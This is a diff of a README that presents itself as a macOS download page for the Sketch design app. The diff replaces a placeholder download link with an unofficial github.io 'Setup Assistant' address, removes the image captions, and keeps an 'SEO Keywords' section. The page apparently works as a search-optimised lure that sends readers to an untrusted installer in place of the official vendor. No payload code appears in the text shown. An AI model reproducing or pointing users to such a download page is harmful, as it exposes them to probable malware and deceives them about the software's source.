@@ -1,6 +1,6 @@
-# Sketch — Download for macOS (Offline Setup Guide)
+# Sketch — Download for macOS 
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://shuziktobehuman.github.io/huja/sketch)
 
 ⚙️ **How to Use**
 
@@ -22,13 +22,13 @@
 🖼 **Preview**
 
 ![Sketch UI Overview](https://barrysmyth.me/wp-content/uploads/2013/01/sketch.jpg)  
-*Classic Sketch interface on macOS*
+
 
 ![Design Workspace](https://cdn.cultofmac.com/wp-content/uploads/2014/04/2.jpg)  
-*Layer management and artboards*
+
 
 ![Canvas and Prototyping](https://www.elegantthemes.com/blog/wp-content/uploads/2019/07/Canvas-1024x640.jpg)  
-*UI/UX prototyping canvas*
+
 
 
 🔍 **SEO Keywords**
